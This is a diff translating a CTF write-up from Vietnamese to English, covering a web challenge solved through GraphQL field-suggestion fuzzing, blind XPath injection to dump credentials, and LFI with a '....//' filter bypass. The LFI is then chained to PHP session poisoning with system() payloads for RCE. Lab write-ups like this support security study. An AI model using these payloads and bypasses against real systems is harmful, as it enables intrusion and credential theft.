@@ -11,44 +11,44 @@ draft: false
 
 ## Part 1
 
-### Recon ban đầu
+### Initial recon
 
 ![](./image.png)
 
-Thử login với tài khoản bất kỳ:
+Try logging in with any account:
 
 ```text
 Username: a
 Password: a
 ```
 
-Burp bắt được request tới endpoint `/graphql`:
+Burp captures a request to the `/graphql` endpoint:
 
 ![](./image-1.png)
 
-Như vậy backend sử dụng GraphQL tại:
+So the backend uses GraphQL at:
 
 ```text
 /graphql
 ```
 
-### Kiểm tra GraphQL field suggestion
+### Checking GraphQL field suggestion
 
-Thử sửa mutation từ `login` thành `log`:
+Try changing the mutation from `login` to `log`:
 
 ![](./image-2.png)
 
-Điều này xác nhận GraphQL server có bật field suggestion. Khi gọi sai tên field, server sẽ gợi ý field gần đúng. Đây là điểm quan trọng vì introspection có thể bị tắt, nhưng field suggestion vẫn leak được tên mutation ẩn.
+This confirms the GraphQL server has field suggestion enabled. When calling a field with a wrong name, the server suggests the closest field. This is important because introspection may be disabled, but field suggestion can still leak the names of hidden mutations.
 
-### Tìm mutation ẩn
+### Finding the hidden mutation
 
-Dùng wordlist này:
+Use this wordlist:
 
 ```
 git clone https://github.com/Escape-Technologies/graphql-wordlist
 ```
 
-Rồi fuzz:
+Then fuzz:
 ```
 ffuf -w graphql-wordlist/wordlists/mutationFieldWordlist.txt:FUZZ \
 -u https://vibed-intranet-p1-05ec2a6cf75a19f7.tjc.tf/graphql \
@@ -58,22 +58,22 @@ ffuf -w graphql-wordlist/wordlists/mutationFieldWordlist.txt:FUZZ \
 -mc all -fs 0-200
 ```
 
-Test luôn kết quả đầu:
+Test the first result right away:
 ```
 updateSnippet           [Status: 400, Size: 205, Words: 11, Lines: 2, Duration: 995ms]
 ```
 
 ![](./image-3.png)
 
-Tìm được mutation ẩn:
+Found the hidden mutation:
 
 ```text
 updateStudentX
 ```
 
-### Xác định format đúng của `updateStudentX`
+### Determining the correct format of `updateStudentX`
 
-Thay mutation `updateStudentX`, ta nhận báo lỗi:
+Switching to the `updateStudentX` mutation, we get the errors:
 
 ```
 Unknown argument "password" on field "Mutation.updateStudentX".
@@ -84,9 +84,9 @@ Field "updateStudentX" argument "description" of type "String!" is required, but
 Field "updateStudentX" argument "grade" of type "Int!" is required, but it was not provided.
 ```
 
-Vì mutation này không nhận `password`, đồng thời không có các field như `authenticated`, `token`, `tokenExpiresAt`.
+Because this mutation does not take `password`, and also does not have fields like `authenticated`, `token`, `tokenExpiresAt`.
 
-=> Format đúng là:
+=> The correct format is:
 
 ```json
 {
@@ -112,11 +112,11 @@ Response:
 }
 ```
 
-Dù server báo thiếu token, field `ok` vẫn có thể phản ánh kết quả xử lý phía backend.
+Even though the server reports a missing token, the `ok` field can still reflect the result of the backend processing.
 
-### Xác nhận Blind XPath Injection
+### Confirming Blind XPath Injection
 
-Thử payload luôn đúng:
+Try an always-true payload:
 
 ```json
 {
@@ -142,7 +142,7 @@ Response:
 }
 ```
 
-Thử payload luôn sai:
+Try an always-false payload:
 
 ```json
 {
@@ -168,13 +168,13 @@ Response:
 }
 ```
 
-=> Tham số `username` bị đưa vào XPath query không an toàn.
+=> The `username` parameter is placed into an XPath query unsafely.
 
 ---
 
-### Dump XML bằng xcat
+### Dumping XML with xcat
 
-Script dump XML:
+XML dump script:
 
 ```python
 import asyncio
@@ -244,7 +244,7 @@ async def main():
 asyncio.run(main())
 ```
 
-Kết quả dump được XML chứa credential:
+The dump produces XML containing the credentials:
 
 ```xml
 <tjPortal>
@@ -261,7 +261,7 @@ Kết quả dump được XML chứa credential:
 </tjPortal>
 ```
 
-Credential thu được:
+The credentials obtained:
 
 ```text
 Username: Andyrew
@@ -278,13 +278,13 @@ tjctf{w0W_y0U_r3A1ly_w3Nt_1n_bL1ND}
 
 ---
 
-## Part 2 
+## Part 2
 
-### Xác định endpoint preview
+### Identifying the preview endpoint
 
-Sau khi login vào portal, ta thấy chức năng MOTD Upload.
+After logging into the portal, we see the MOTD Upload feature.
 
-Bấm Upload MOTD, Burp bắt được request:
+Click Upload MOTD, and Burp captures the request:
 
 ```http
 GET /preview.php?view=default.txt HTTP/2
@@ -292,7 +292,7 @@ Host: vibed-intranet-p1-05ec2a6cf75a19f7.tjc.tf
 Cookie: PHPSESSID=53c9b76f9acca9dd1483ff10c3aaeee5
 ```
 
-Response trả về nội dung MOTD mặc định:
+The response returns the default MOTD content:
 
 ```text
 Welcome to the TJ Intranet. Please report any security vulnerabilities you find to staff!
@@ -304,7 +304,7 @@ Endpoint:
 /preview.php?view=
 ```
 
-### Test Local File Inclusion
+### Testing Local File Inclusion
 
 ```text
 ....//....//....//....//....//etc/passwd
@@ -334,13 +334,13 @@ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 andrew:x:1000:1000::/home/andrew:/bin/bash
 ```
 
-Như vậy tham số `view` bị Local File Inclusion.
+So the `view` parameter is vulnerable to Local File Inclusion.
 
-Lý do là server có filter xóa `../` nhưng chỉ xử lý một lần. Khi dùng `....//`, sau khi filter loại bỏ `../`, chuỗi có thể biến thành traversal hợp lệ dạng `../`.
+The reason is that the server has a filter removing `../`, but it only processes it once. When using `....//`, after the filter removes `../`, the string can turn into a valid traversal in the form `../`.
 
-### Đọc PHP session file bằng LFI
+### Reading the PHP session file via LFI
 
-Có `PHPSESSID=53c9b76f9acca9dd1483ff10c3aaeee5`, nhập:
+We have `PHPSESSID=53c9b76f9acca9dd1483ff10c3aaeee5`, enter:
 
 ```text
 ....//....//....//....//....//var/lib/php/sessions/sess_53c9b76f9acca9dd1483ff10c3aaeee5
@@ -352,24 +352,24 @@ Response:
 username|s:7:"Andyrew";token_expires_at|s:24:"2026-05-30T16:10:20.673Z";recent_views|a:4:{i:0;s:11:"default.txt";i:1;s:11:"default.txt";i:2;s:40:"....//....//....//....//....//etc/passwd";i:3;s:88:"....//....//....//....//....//var/lib/php/sessions/sess_53c9b76f9acca9dd1483ff10c3aaeee5";}
 ```
 
-Session có field:
+The session has the field:
 
 ```text
 recent_views
 ```
 
-Các giá trị từng nhập vào `view` được ghi lại trong session file. Đây là cơ sở để poison session bằng PHP code.
+The values previously entered into `view` are recorded in the session file. This is the basis for poisoning the session with PHP code.
 
-### Session poisoning để kiểm tra RCE
+### Session poisoning to test for RCE
 
-<!-- Ý tưởng:
+<!-- Idea:
 
-1. Nhập PHP code vào ô **MOTD filename**.
-2. App ghi giá trị đó vào `recent_views` trong session.
-3. Dùng LFI include lại session file.
-4. PHP code trong session file được parse và execute.
+1. Enter PHP code into the **MOTD filename** field.
+2. The app writes that value into `recent_views` in the session.
+3. Use LFI to include the session file again.
+4. The PHP code in the session file gets parsed and executed.
 
-Trên giao diện web, nhập: -->
+On the web UI, enter: -->
 
 ```php
 <?php system("ls /home/"); ?>
@@ -381,65 +381,65 @@ Response:
 Document not found.
 ```
 
-Điều này bình thường. Mục tiêu của request này không phải đọc file trực tiếp, mà là ghi PHP payload vào session.
+This is normal. The goal of this request is not to read a file directly, but to write the PHP payload into the session.
 
-Sau đó include lại session file bằng cách nhập:
+Then include the session file again by entering:
 
 ```text
 ....//....//....//....//....//var/lib/php/sessions/sess_53c9b76f9acca9dd1483ff10c3aaeee5
 ```
 
-Trong session output có thể thấy:
+In the session output we can see:
 
 ```text
 ;i:4;s:29:"andrew
 ";i:5;s:88
 ```
 
-Điều này chứng minh payload đã được thực thi thành công và ta đã có RCE.
+This proves the payload was executed successfully and we have RCE.
 
-### Liệt kê thư mục `/home/andrew`
+### Listing the `/home/andrew` directory
 
 ```php
 <?php system("ls /home/andrew"); ?>
 ```
 
-Sau đó include lại session file bằng cách nhập:
+Then include the session file again by entering:
 
 ```text
 ....//....//....//....//....//var/lib/php/sessions/sess_53c9b76f9acca9dd1483ff10c3aaeee5
 ```
 
-Trong session output:
+In the session output:
 
 ```text
 i:4;s:35:"2283274892734342376.txt
 ";i:5
 ```
 
-### Đọc flag
+### Reading the flag
 
-Nếu đọc trực tiếp file:
+If we read the file directly:
 
 ```php
 <?php system("cat /home/andrew/2283274892734342376.txt"); ?>
 ```
 
-web có thể trả:
+the web may return:
 
 ```text
 This file type was blocked.
 ```
 
-Nguyên nhân là trong `view` có literal `.txt`, filter của backend có thể nhận diện extension và chặn.
+The reason is that `view` contains the literal `.txt`, and the backend filter can detect the extension and block it.
 
-Bypass bằng wildcard `*` thay vì ghi trực tiếp tên file `.txt`.
+Bypass it with the wildcard `*` instead of writing the `.txt` filename directly.
 
 ```php
 <?php system("cat /home/andrew/*"); ?>
 ```
 
-Sau đó include lại session file lần cuối bằng cách nhập:
+Then include the session file one last time by entering:
 
 ```text
 ....//....//....//....//....//var/lib/php/sessions/sess_53c9b76f9acca9dd1483ff10c3aaeee5
